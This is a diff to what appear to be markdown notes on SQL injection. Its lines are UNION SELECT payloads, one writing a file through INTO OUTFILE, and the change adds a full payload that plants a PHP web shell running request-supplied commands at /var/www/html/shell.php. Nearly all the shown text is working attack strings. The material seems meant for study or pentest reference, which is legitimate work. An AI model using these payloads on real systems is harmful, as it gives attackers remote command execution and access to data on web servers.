@@ -88,4 +88,5 @@ Now the payload for this becomes : `value' UNION SELECT 1, variable_name, variab
 So the payload to write the file becomes : `value' UNION SELECT 1, 'file written successfully!', 3, 4 INT O OUTFILE '/var/www/html/proof.txt'-- -`
 
 ## Writing a Web Shell
-`value' UNION SELECT "", `
+`val' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` : Payload to enter a PHP Web Shell into the SQL Server.
+
